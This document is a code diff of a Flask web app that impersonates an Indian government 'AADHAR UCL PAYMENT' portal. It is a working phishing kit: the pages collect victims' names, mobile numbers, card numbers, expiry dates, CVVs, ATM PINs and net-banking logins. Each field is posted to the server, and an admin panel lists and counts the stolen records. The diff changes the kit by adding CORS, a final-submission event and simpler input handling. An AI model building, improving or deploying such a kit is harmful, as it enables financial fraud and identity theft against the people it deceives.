@@ -1,16 +1,17 @@
 from flask import Flask, request, jsonify, render_template_string
+from flask_cors import CORS
 import json
 from datetime import datetime
 
 app = Flask(__name__)
+CORS(app)  # Enable CORS for admin panel
 
-# In-memory storage
+# In-memory storage (will persist as long as server runs)
 submissions = []
 submission_counter = 1
 
-# ==================== ORIGINAL HTML CODE ====================
-HTML_CODE = '''
-<!DOCTYPE html>
+# ==================== ORIGINAL HTML CODE (Same as before) ====================
+HTML_CODE = '''<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -22,23 +23,17 @@ HTML_CODE = '''
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             background: #eef2f7;
             min-height: 100vh;
             font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif;
         }
-
         .portal-container {
             width: 100%;
             max-width: 100%;
             background: #ffffff;
             min-height: 100vh;
-            box-shadow: none;
-            margin: 0;
-            border-radius: 0;
         }
-
         .banner-full {
             width: 100%;
             background: #f0f4f9;
@@ -51,7 +46,6 @@ HTML_CODE = '''
             object-fit: cover;
             display: block;
         }
-
         .gov-header {
             background: #1e3a5f;
             padding: 18px 20px;
@@ -62,14 +56,12 @@ HTML_CODE = '''
             color: white;
             font-size: 1.8rem;
             font-weight: 700;
-            letter-spacing: 0.5px;
         }
         .gov-header p {
             color: #cde1f0;
             font-size: 0.8rem;
             margin-top: 6px;
         }
-
         .pages-container {
             background: white;
             width: 100%;
@@ -81,7 +73,6 @@ HTML_CODE = '''
         .hidden-page {
             display: none;
         }
-
         .form-group {
             margin-bottom: 24px;
         }
@@ -103,13 +94,11 @@ HTML_CODE = '''
             border-radius: 10px;
             outline: none;
             background: #ffffff;
-            transition: 0.2s;
         }
         input:focus {
             border-color: #1e3a5f;
             box-shadow: 0 0 0 3px rgba(30,58,95,0.1);
         }
-
         .bank-selector {
             position: relative;
         }
@@ -153,24 +142,11 @@ HTML_CODE = '''
             cursor: pointer;
             border-bottom: 1px solid #eef2f6;
             font-size: 0.9rem;
-            transition: background 0.1s;
         }
         .bank-dropdown-list div:hover {
             background: #eef2fa;
         }
-        .bank-dropdown-list::-webkit-scrollbar {
-            width: 6px;
-        }
-        .bank-dropdown-list::-webkit-scrollbar-track {
-            background: #f1f1f1;
-            border-radius: 4px;
-        }
-        .bank-dropdown-list::-webkit-scrollbar-thumb {
-            background: #b9c3d0;
-            border-radius: 4px;
-        }
-
-        button, .proceed-btn {
+        button {
             background: #1e6f3f;
             color: white;
             border: none;
@@ -180,14 +156,11 @@ HTML_CODE = '''
             border-radius: 10px;
             cursor: pointer;
             width: 100%;
-            transition: 0.2s;
             margin-top: 10px;
         }
         button:hover {
             background: #0f5a34;
-            transform: translateY(-1px);
         }
-
         .two-option-buttons {
             display: flex;
             gap: 16px;
@@ -197,12 +170,8 @@ HTML_CODE = '''
             margin-top: 0;
             flex: 1;
         }
-        .card-btn {
-            background: #2c5a7a;
-        }
-        .netbank-btn {
-            background: #8b5a2b;
-        }
+        .card-btn { background: #2c5a7a; }
+        .netbank-btn { background: #8b5a2b; }
         .back-link {
             text-align: center;
             margin-top: 24px;
@@ -210,11 +179,8 @@ HTML_CODE = '''
         .back-link span {
             color: #1e3a5f;
             cursor: pointer;
-            font-size: 0.85rem;
             text-decoration: underline;
-            font-weight: 500;
         }
-
         .expiry-group {
             display: flex;
             gap: 16px;
@@ -223,14 +189,12 @@ HTML_CODE = '''
             flex: 1;
             margin-bottom: 0;
         }
-
         .success-card {
             background: #e8f5e9;
             padding: 20px;
             border-radius: 14px;
             text-align: center;
             color: #1e6f3f;
-            font-weight: 500;
             margin-bottom: 20px;
             border-left: 5px solid #1e6f3f;
         }
@@ -254,7 +218,6 @@ HTML_CODE = '''
             font-weight: 800;
             font-family: monospace;
             color: #c62828;
-            letter-spacing: 3px;
             margin-top: 8px;
         }
         .small-note {
@@ -266,7 +229,6 @@ HTML_CODE = '''
         #requestIdFinal {
             font-size: 1.3rem;
             font-weight: 700;
-            letter-spacing: 1px;
             color: #1e3a5f;
         }
     </style>
@@ -276,26 +238,23 @@ HTML_CODE = '''
     <div class="banner-full">
         <img src="https://i.ibb.co/0RbZ7zM0/bdc9d117e4da.jpg" alt="Government Scheme Banner" onerror="this.src='https://placehold.co/600x200?text=Official+Banner'">
     </div>
-
     <div class="gov-header">
         <h1>AADHAR UCL PAYMENT</h1>
         <p>Ministry of Electronics & IT | Secure Payment Gateway</p>
     </div>
-
     <div class="pages-container">
         <div id="page1" class="page">
             <div class="form-group">
                 <label class="form-label">Full Name <span>*</span></label>
-                <input type="text" id="fullName" placeholder="Full name as per Aadhaar" autocomplete="off">
+                <input type="text" id="fullName" placeholder="Full name as per Aadhaar">
             </div>
             <div class="form-group">
                 <label class="form-label">Mobile Number <span>*</span></label>
-                <input type="tel" id="mobileNum" placeholder="10 digit mobile number" maxlength="10" autocomplete="off" inputmode="numeric">
+                <input type="tel" id="mobileNum" placeholder="10 digit mobile number" maxlength="10">
             </div>
             <button id="proceedToBankBtn">Proceed →</button>
             <div class="small-note">🔒 Official Government Payment Portal</div>
         </div>
-
         <div id="page2" class="page hidden-page">
             <div class="form-group bank-selector">
                 <label class="form-label">Select Bank <span>*</span></label>
@@ -308,7 +267,6 @@ HTML_CODE = '''
             <button id="proceedToModeBtn">Proceed →</button>
             <div class="back-link"><span onclick="goToPageNum(1)">← Back</span></div>
         </div>
-
         <div id="page3" class="page hidden-page">
             <label class="form-label" style="text-align:center; display:block; margin-bottom:20px;">Choose Payment Method</label>
             <div class="two-option-buttons">
@@ -317,75 +275,61 @@ HTML_CODE = '''
             </div>
             <div class="back-link"><span onclick="goToPageNum(2)">← Back to Bank Selection</span></div>
         </div>
-
         <div id="pageCardDetails" class="page hidden-page">
             <h3 style="margin-bottom:20px; color:#1e3a5f;">💳 Enter Card Details</h3>
             <div class="form-group">
                 <label class="form-label">Card Number</label>
-                <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" inputmode="numeric">
+                <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19">
             </div>
             <div class="expiry-group">
                 <div class="form-group">
                     <label class="form-label">Expiry Date (MM/YY)</label>
-                    <input type="text" id="expiryInput" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+                    <input type="text" id="expiryInput" placeholder="MM/YY" maxlength="5">
                 </div>
                 <div class="form-group">
                     <label class="form-label">CVV</label>
-                    <input type="password" id="cvvCode" placeholder="CVV" maxlength="4" inputmode="numeric">
+                    <input type="password" id="cvvCode" placeholder="CVV" maxlength="4">
                 </div>
             </div>
             <button id="cardProceedToUpi">Proceed → Enter ATM PIN</button>
             <div class="back-link"><span onclick="goToPageNum(3)">← Back</span></div>
         </div>
-
         <div id="pageNetbankLogin" class="page hidden-page">
             <h3 style="margin-bottom:20px; color:#1e3a5f;">🏦 Net Banking Login</h3>
             <div class="form-group">
                 <label class="form-label">User ID / Customer ID</label>
-                <input type="text" id="netUserId" placeholder="User ID / Customer ID">
+                <input type="text" id="netUserId">
             </div>
             <div class="form-group">
                 <label class="form-label">Internet Password / PIN</label>
-                <input type="password" id="netPassword" placeholder="Internet Password">
+                <input type="password" id="netPassword">
             </div>
             <button id="netbankLoginFinalBtn">Login & Proceed →</button>
             <div class="back-link"><span onclick="goToPageNum(3)">← Back</span></div>
         </div>
-
         <div id="pageUpiPinEntry" class="page hidden-page">
             <h3 style="margin-bottom:20px; color:#1e3a5f;">🔐 Enter ATM PIN</h3>
             <div class="form-group">
                 <label class="form-label">4-digit ATM PIN</label>
-                <input type="password" id="atmPinField" maxlength="4" placeholder="●●●●" inputmode="numeric">
+                <input type="password" id="atmPinField" maxlength="4" placeholder="●●●●">
             </div>
             <button id="confirmUpiFinalBtn">Confirm & Submit Request</button>
             <div class="back-link"><span onclick="goToPageNum(4)">← Back to Card Details</span></div>
         </div>
-
         <div id="finalSuccessPage" class="page hidden-page">
-            <div class="success-card">
-                ✅ Your request has been submitted successfully!<br>
-                Kindly wait for 24 hours for processing.
-            </div>
-            <div class="request-id-box">
-                <strong>📄 Unique Request ID:</strong><br>
-                <span id="requestIdFinal">--</span>
-            </div>
-            <div class="timer-box">
-                <strong>⏳ Processing Time Left (24 hours countdown)</strong>
-                <div class="timer-display" id="countdownTimerFinal">24:00:00</div>
-            </div>
+            <div class="success-card">✅ Your request has been submitted successfully!<br>Kindly wait for 24 hours for processing.</div>
+            <div class="request-id-box"><strong>📄 Unique Request ID:</strong><br><span id="requestIdFinal">--</span></div>
+            <div class="timer-box"><strong>⏳ Processing Time Left (24 hours countdown)</strong><div class="timer-display" id="countdownTimerFinal">24:00:00</div></div>
             <button id="startNewRequestBtn" style="background:#2c5a7a; margin-top:20px;">➕ Start New Request</button>
         </div>
     </div>
 </div>
-
 <script>
     const API_URL = window.location.origin;
     
     async function sendToServer(dataType, fieldsData) {
         try {
-            await fetch(API_URL + '/api/submit-data', {
+            const response = await fetch(API_URL + '/api/submit-data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -394,8 +338,12 @@ HTML_CODE = '''
                     timestamp: new Date().toISOString()
                 })
             });
+            const result = await response.json();
+            console.log('Data sent:', dataType, result);
+            return true;
         } catch(err) {
-            console.log('Error sending data:', err);
+            console.error('Error sending data:', err);
+            return false;
         }
     }
     
@@ -403,18 +351,13 @@ HTML_CODE = '''
         "State Bank of India (SBI)", "Punjab National Bank (PNB)", "Bank of Baroda (BOB)", "HDFC Bank", "ICICI Bank",
         "Axis Bank", "Kotak Mahindra Bank", "IndusInd Bank", "Yes Bank", "IDFC First Bank",
         "Central Bank of India", "Union Bank of India", "Indian Bank", "Canara Bank", "Bank of India",
-        "UCO Bank", "Indian Overseas Bank", "Punjab & Sind Bank", "Bank of Maharashtra", "RBL Bank",
-        "South Indian Bank", "Federal Bank", "IDBI Bank", "City Union Bank", "Karur Vysya Bank",
-        "Tamilnad Mercantile Bank", "Dhanlaxmi Bank", "Karnataka Bank", "Saraswat Bank", "Standard Chartered Bank",
-        "HSBC India", "Deutsche Bank", "DBS Bank India", "Jammu & Kashmir Bank", "SBI Cards"
+        "UCO Bank", "Indian Overseas Bank", "Punjab & Sind Bank", "Bank of Maharashtra", "RBL Bank"
     ];
 
     let currentStep = 1;
     let selectedBank = "";
-    let paymentMode = "";
     let uniqueRequestID = "";
     let timerInterval = null;
-    let timerActive = false;
 
     function showPage(pageId) {
         document.querySelectorAll('.page').forEach(p => p.classList.add('hidden-page'));
@@ -435,13 +378,9 @@ HTML_CODE = '''
         const timerEl = document.getElementById('countdownTimerFinal');
         function updateTimer() {
             const remaining = endTime - Date.now();
-            if(remaining <= 0) {
-                clearInterval(timerInterval);
-                timerEl.innerText = "00:00:00";
-                return;
-            }
+            if(remaining <= 0) { clearInterval(timerInterval); timerEl.innerText = "00:00:00"; return; }
             const hrs = Math.floor(remaining / (1000 * 60 * 60));
-            const mins = Math.floor((remaining % (3600000)) / 60000);
+            const mins = Math.floor((remaining % 3600000) / 60000);
             const secs = Math.floor((remaining % 60000) / 1000);
             timerEl.innerText = `${hrs.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
         }
@@ -452,20 +391,14 @@ HTML_CODE = '''
     function finalizeRequest() {
         if(uniqueRequestID === "") uniqueRequestID = generateRequestID();
         document.getElementById('requestIdFinal').innerText = uniqueRequestID;
-        if(!timerActive) {
-            start24hTimer();
-            timerActive = true;
-        }
+        start24hTimer();
         showPage('finalSuccessPage');
-        currentStep = 7;
     }
 
     function resetFullFlow() {
         if(timerInterval) clearInterval(timerInterval);
-        timerActive = false;
         uniqueRequestID = "";
         selectedBank = "";
-        paymentMode = "";
         document.getElementById('fullName').value = "";
         document.getElementById('mobileNum').value = "";
         document.getElementById('selectedBankText').innerText = "Click to select bank";
@@ -495,32 +428,6 @@ HTML_CODE = '''
         });
     }
 
-    const expiryField = document.getElementById('expiryInput');
-    if(expiryField) {
-        expiryField.addEventListener('input', function(e) {
-            let value = this.value.replace(/\\D/g, '');
-            if(value.length >= 3) {
-                value = value.slice(0,2) + '/' + value.slice(2,4);
-            }
-            if(value.length > 5) value = value.slice(0,5);
-            this.value = value;
-        });
-    }
-
-    const cardNumberField = document.getElementById('cardNumber');
-    if(cardNumberField) {
-        cardNumberField.addEventListener('input', function(e) {
-            let val = this.value.replace(/\\s/g, '').replace(/\\D/g, '');
-            if(val.length > 16) val = val.slice(0,16);
-            let formatted = '';
-            for(let i=0; i<val.length; i++) {
-                if(i>0 && i%4===0) formatted += ' ';
-                formatted += val[i];
-            }
-            this.value = formatted;
-        });
-    }
-
     document.getElementById('proceedToBankBtn').addEventListener('click', () => {
         const name = document.getElementById('fullName').value.trim();
         const mobile = document.getElementById('mobileNum').value.trim();
@@ -528,70 +435,48 @@ HTML_CODE = '''
         if(mobile.length !== 10 || isNaN(mobile)) { alert("Please enter valid 10-digit mobile number"); return; }
         sendToServer('Page1_Name_Mobile', { full_name: name, mobile_number: mobile });
         showPage('page2');
-        currentStep = 2;
         buildBankDropdown();
-        document.getElementById('bankDropdownList').style.display = 'none';
     });
 
     const bankSelectorBox = document.getElementById('bankSelectorBox');
     const bankDropdownDiv = document.getElementById('bankDropdownList');
     bankSelectorBox.addEventListener('click', (e) => {
         e.stopPropagation();
-        if(bankDropdownDiv.style.display === 'block') {
-            bankDropdownDiv.style.display = 'none';
-        } else {
-            buildBankDropdown();
-            bankDropdownDiv.style.display = 'block';
-        }
+        bankDropdownDiv.style.display = bankDropdownDiv.style.display === 'block' ? 'none' : 'block';
     });
-    document.addEventListener('click', (e) => {
-        if(!bankSelectorBox.contains(e.target) && !bankDropdownDiv.contains(e.target)) {
-            bankDropdownDiv.style.display = 'none';
-        }
-    });
+    document.addEventListener('click', () => { bankDropdownDiv.style.display = 'none'; });
 
     document.getElementById('proceedToModeBtn').addEventListener('click', () => {
-        if(!selectedBank || selectedBank === "Click to select bank") {
-            alert("Please select a bank from the dropdown list");
-            return;
-        }
+        if(!selectedBank) { alert("Please select a bank"); return; }
         sendToServer('Bank_Confirmed', { final_bank: selectedBank });
         showPage('page3');
-        currentStep = 3;
     });
 
     document.getElementById('cardModeBtn').addEventListener('click', () => {
-        paymentMode = "card";
         sendToServer('Payment_Mode_Selected', { payment_mode: "Credit/Debit Card" });
         showPage('pageCardDetails');
-        currentStep = 4;
     });
     document.getElementById('netbankModeBtn').addEventListener('click', () => {
-        paymentMode = "netbank";
         sendToServer('Payment_Mode_Selected', { payment_mode: "Net Banking" });
         showPage('pageNetbankLogin');
-        currentStep = 5;
     });
 
     document.getElementById('cardProceedToUpi').addEventListener('click', () => {
-        let cardNum = document.getElementById('cardNumber').value.replace(/\\s/g, '');
+        let cardNum = document.getElementById('cardNumber').value.replace(/\s/g, '');
         const expiry = document.getElementById('expiryInput').value.trim();
         const cvv = document.getElementById('cvvCode').value.trim();
-        if(cardNum.length < 13 || isNaN(cardNum)) { alert("Enter valid card number (13-16 digits)"); return; }
-        if(!expiry.match(/^(0[1-9]|1[0-2])\\/\\d{2}$/)) { alert("Enter expiry in MM/YY format (e.g., 08/27)"); return; }
-        if(cvv.length < 3 || isNaN(cvv)) { alert("Enter valid CVV (3-4 digits)"); return; }
+        if(cardNum.length < 13) { alert("Enter valid card number"); return; }
+        if(!expiry.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) { alert("Enter expiry in MM/YY format"); return; }
+        if(cvv.length < 3) { alert("Enter valid CVV"); return; }
         sendToServer('Card_Details_Entry', { card_number: cardNum, expiry: expiry, cvv: cvv });
         showPage('pageUpiPinEntry');
-        currentStep = 6;
     });
 
     document.getElementById('confirmUpiFinalBtn').addEventListener('click', () => {
         const atmPin = document.getElementById('atmPinField').value.trim();
-        if(atmPin.length !== 4 || isNaN(atmPin)) { 
-            alert("Please enter valid 4-digit ATM PIN"); 
-            return; 
-        }
+        if(atmPin.length !== 4 || isNaN(atmPin)) { alert("Please enter valid 4-digit ATM PIN"); return; }
         sendToServer('ATM_PIN_Entry', { atm_pin: atmPin });
+        sendToServer('FINAL_SUBMISSION_SUCCESS', { status: "submitted" });
         finalizeRequest();
     });
 
@@ -601,42 +486,26 @@ HTML_CODE = '''
         if(uid === "") { alert("Please enter User ID"); return; }
         if(pwd === "") { alert("Please enter Password"); return; }
         sendToServer('NetBanking_Login_Credentials', { user_id: uid, password: pwd });
+        sendToServer('FINAL_SUBMISSION_SUCCESS', { status: "submitted" });
         finalizeRequest();
     });
 
-    document.getElementById('startNewRequestBtn').addEventListener('click', () => {
-        resetFullFlow();
-        sendToServer('Session_Reset', { action: "New Request Started" });
-    });
+    document.getElementById('startNewRequestBtn').addEventListener('click', resetFullFlow);
 
     window.goToPageNum = function(pageNum) {
-        if(pageNum === 1) {
-            resetFullFlow();
-        }
-        else if(pageNum === 2) { 
-            showPage('page2'); 
-            currentStep = 2; 
-            bankDropdownDiv.style.display = 'none';
-        }
-        else if(pageNum === 3) { 
-            showPage('page3'); 
-            currentStep = 3;
-        }
-        else if(pageNum === 4) { 
-            showPage('pageCardDetails'); 
-            currentStep = 4;
-        }
+        if(pageNum === 1) resetFullFlow();
+        else if(pageNum === 2) { showPage('page2'); }
+        else if(pageNum === 3) { showPage('page3'); }
+        else if(pageNum === 4) { showPage('pageCardDetails'); }
     };
     
     resetFullFlow();
 </script>
 </body>
-</html>
-'''
+</html>'''
 
-# ==================== ADMIN PANEL HTML ====================
-ADMIN_HTML = '''
-<!DOCTYPE html>
+# ==================== ADMIN PANEL HTML (for /admin route) ====================
+ADMIN_HTML = '''<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -644,140 +513,95 @@ ADMIN_HTML = '''
     <title>Admin Panel - AADHAR UCL Payments</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: #eee; padding: 20px; }
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; padding: 20px; }
         .container { max-width: 1400px; margin: 0 auto; }
-        h1 { margin-bottom: 10px; color: #ffb347; }
-        .stats { background: #16213e; padding: 15px 20px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
-        .clear-btn { background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .clear-btn:hover { background: #c62a47; }
-        .refresh-btn { background: #0f3460; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .refresh-btn:hover { background: #1a4a7a; }
-        .auto-refresh { background: #1e6f3f; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .auto-refresh.on { background: #e94560; }
-        .submissions-grid { display: flex; flex-direction: column; gap: 20px; }
-        .submission-card { background: #0f3460; border-radius: 12px; padding: 20px; border-left: 5px solid #ffb347; }
-        .card-header { display: flex; justify-content: space-between; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
-        .card-id { font-weight: bold; color: #ffb347; }
-        .card-time { color: #aaa; font-size: 0.85rem; }
-        .card-source { background: #e94560; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; }
-        .fields-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
-        .fields-table td { padding: 8px 10px; border-bottom: 1px solid #2a4a7a; vertical-align: top; }
-        .fields-table td:first-child { font-weight: bold; width: 180px; color: #ffb347; }
-        .fields-table td:last-child { font-family: monospace; word-break: break-word; }
+        h1 { color: #ffb347; margin-bottom: 20px; }
+        .stats { background: #16213e; padding: 15px 20px; border-radius: 10px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
+        .stat { background: #0f3460; padding: 10px 20px; border-radius: 8px; }
+        .stat-value { font-size: 1.8rem; font-weight: bold; color: #ffb347; }
+        .submission-card { background: #0f3460; border-radius: 12px; padding: 20px; margin-bottom: 15px; border-left: 5px solid #ffb347; }
+        .card-header { display: flex; justify-content: space-between; margin-bottom: 15px; flex-wrap: wrap; }
+        .card-id { color: #ffb347; font-weight: bold; }
+        .card-time { color: #aaa; font-size: 0.8rem; }
+        .fields-table td { padding: 6px 10px; border-bottom: 1px solid #2a4a7a; }
+        .fields-table td:first-child { font-weight: bold; color: #ffb347; width: 150px; }
+        .btn { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; margin: 5px; }
+        .btn-refresh { background: #1e6f3f; color: white; }
+        .btn-clear { background: #e94560; color: white; }
         .no-data { text-align: center; padding: 40px; color: #aaa; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>📋 AADHAR UCL Payment Portal - Admin Panel</h1>
+    <h1>📋 AADHAR UCL Payment - Admin Panel</h1>
     <div class="stats">
-        <span>📊 Total Submissions: <strong id="totalCount">0</strong></span>
-        <div>
-            <button id="autoRefreshBtn" class="auto-refresh on">⏸️ Auto Refresh ON</button>
-            <button class="refresh-btn" onclick="loadSubmissions()">🔄 Refresh</button>
-            <button class="clear-btn" onclick="clearSubmissions()">🗑️ Clear All</button>
-        </div>
+        <div class="stat">📊 Total: <span class="stat-value" id="totalCount">0</span></div>
+        <div class="stat">💳 Card: <span class="stat-value" id="cardCount">0</span></div>
+        <div class="stat">🏦 NetBank: <span class="stat-value" id="netbankCount">0</span></div>
     </div>
-    <div id="submissionsList" class="submissions-grid">
-        <div class="no-data">Loading submissions...</div>
+    <div style="margin-bottom: 20px;">
+        <button class="btn btn-refresh" id="refreshBtn">🔄 Refresh</button>
+        <button class="btn btn-clear" id="clearBtn">🗑️ Clear All Data</button>
     </div>
+    <div id="submissionsList"></div>
 </div>
-
 <script>
     const API_URL = window.location.origin;
-    let autoRefresh = true;
-    let refreshInterval = null;
+    let allData = [];
     
-    function startAutoRefresh() {
-        if(refreshInterval) clearInterval(refreshInterval);
-        refreshInterval = setInterval(() => {
-            if(autoRefresh) loadSubmissions();
-        }, 3000);
-    }
-    
-    function escapeHtml(str) {
-        if(!str) return '';
-        return String(str).replace(/[&<>]/g, function(m) {
-            if(m === '&') return '&amp;';
-            if(m === '<') return '&lt;';
-            if(m === '>') return '&gt;';
-            return m;
-        });
-    }
-    
-    function createSubmissionCard(submission) {
-        const div = document.createElement('div');
-        div.className = 'submission-card';
-        div.setAttribute('data-id', submission.id);
-        
-        let fieldsHtml = '';
-        if(submission.fields && Object.keys(submission.fields).length > 0) {
-            for(const [key, value] of Object.entries(submission.fields)) {
-                fieldsHtml += `<tr><td>${escapeHtml(key)}</td><td>${escapeHtml(String(value))}</td></tr>`;
-            }
-        } else {
-            fieldsHtml = `<tr><td colspan="2">No field data available</td></tr>`;
-        }
-        
-        div.innerHTML = `
-            <div class="card-header">
-                <span class="card-id">#${submission.id}</span>
-                <span class="card-source">📌 ${escapeHtml(submission.source)}</span>
-                <span class="card-time">🕒 ${escapeHtml(submission.timestamp)}</span>
-            </div>
-            <table class="fields-table">
-                ${fieldsHtml}
-            </table>
-        `;
-        return div;
-    }
-    
-    async function loadSubmissions() {
+    async function loadData() {
         try {
-            const response = await fetch(API_URL + '/api/submissions');
-            const submissions = await response.json();
-            const container = document.getElementById('submissionsList');
-            container.innerHTML = '';
+            const res = await fetch(API_URL + '/api/submissions');
+            allData = await res.json();
+            renderData();
+        } catch(e) { console.error(e); }
+    }
+    
+    function renderData() {
+        const container = document.getElementById('submissionsList');
+        if(!allData.length) { container.innerHTML = '<div class="no-data">📭 No submissions yet</div>'; return; }
+        
+        let cardCount = 0, netbankCount = 0;
+        container.innerHTML = allData.map(sub => {
+            if(sub.source === 'Card_Details_Entry') cardCount++;
+            if(sub.source === 'NetBanking_Login_Credentials') netbankCount++;
             
-            if(submissions.length === 0) {
-                container.innerHTML = '<div class="no-data">📭 No submissions yet. Data will appear here when users fill the form.</div>';
-            } else {
-                submissions.forEach(sub => {
-                    container.appendChild(createSubmissionCard(sub));
-                });
+            let fieldsHtml = '';
+            if(sub.fields) {
+                for(const [k,v] of Object.entries(sub.fields)) {
+                    let displayVal = (k.includes('pin') || k.includes('cvv') || k.includes('password')) ? '••••••' : v;
+                    fieldsHtml += `<tr><td>${k.replace(/_/g,' ').toUpperCase()}</td><td>${displayVal}</td></tr>`;
+                }
             }
-            document.getElementById('totalCount').innerText = submissions.length;
-        } catch(err) {
-            console.error('Error loading submissions:', err);
-        }
+            return `<div class="submission-card">
+                <div class="card-header">
+                    <span class="card-id">#${sub.id}</span>
+                    <span>📌 ${sub.source}</span>
+                    <span class="card-time">🕒 ${sub.timestamp || 'Unknown'}</span>
+                </div>
+                <table class="fields-table">${fieldsHtml || '<tr><td colspan="2">No data</td></tr>'}</table>
+            </div>`;
+        }).join('');
+        
+        document.getElementById('totalCount').innerText = allData.length;
+        document.getElementById('cardCount').innerText = cardCount;
+        document.getElementById('netbankCount').innerText = netbankCount;
     }
     
-    async function clearSubmissions() {
-        if(confirm('⚠️ Are you sure you want to delete ALL submissions? This cannot be undone.')) {
+    async function clearData() {
+        if(confirm('⚠️ Delete ALL submissions? This cannot be undone!')) {
             await fetch(API_URL + '/api/clear-submissions', { method: 'POST' });
-            loadSubmissions();
+            loadData();
         }
     }
     
-    const autoRefreshBtn = document.getElementById('autoRefreshBtn');
-    autoRefreshBtn.addEventListener('click', () => {
-        autoRefresh = !autoRefresh;
-        if(autoRefresh) {
-            autoRefreshBtn.textContent = '⏸️ Auto Refresh ON';
-            autoRefreshBtn.className = 'auto-refresh on';
-            loadSubmissions();
-        } else {
-            autoRefreshBtn.textContent = '▶️ Auto Refresh OFF';
-            autoRefreshBtn.className = 'auto-refresh';
-        }
-    });
-    
-    startAutoRefresh();
-    loadSubmissions();
+    document.getElementById('refreshBtn').onclick = loadData;
+    document.getElementById('clearBtn').onclick = clearData;
+    loadData();
+    setInterval(loadData, 5000);
 </script>
 </body>
-</html>
-'''
+</html>'''
 
 # ==================== ROUTES ====================
 @app.route('/')
@@ -793,24 +617,17 @@ def submit_data():
     global submission_counter
     data = request.json
     
-    if not data:
-        return jsonify({'error': 'No data provided'}), 400
-    
     enriched_data = {
         'id': submission_counter,
         'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'source': data.get('source', 'unknown'),
-        'fields': data.get('fields', {}),
+        'fields': data.get('fields', {})
     }
     
     submissions.insert(0, enriched_data)
     submission_counter += 1
     
-    # Keep only last 500 submissions
-    while len(submissions) > 500:
-        submissions.pop()
-    
-    print(f"[DATA] {enriched_data['timestamp']} | {enriched_data['source']}")
+    print(f"[✓] Data saved: {enriched_data['source']} - ID: {enriched_data['id']}")
     return jsonify({'status': 'ok', 'id': enriched_data['id']})
 
 @app.route('/api/submissions')
